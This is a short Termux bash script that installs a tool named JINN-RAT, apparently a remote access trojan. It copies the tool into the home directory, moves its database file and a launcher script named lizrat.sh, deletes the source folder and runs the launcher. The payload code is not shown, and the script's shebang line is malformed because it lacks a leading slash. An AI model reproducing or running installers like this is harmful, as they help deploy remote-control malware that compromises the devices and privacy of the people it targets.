#!data/data/com.termux/files/usr/bin/bash
cp -rf JINN-RAT $HOME
mv $HOME/JINN-RAT/server/file/maindb.json $HOME/JINN-RAT/server
mv $HOME/JINN-RAT/server/file/lizrat.sh $HOME
rm -rf $HOME/JINN-RAT/server/file
cd $HOME
mkdir lizrat
chmod +x lizrat.sh
bash lizrat.sh
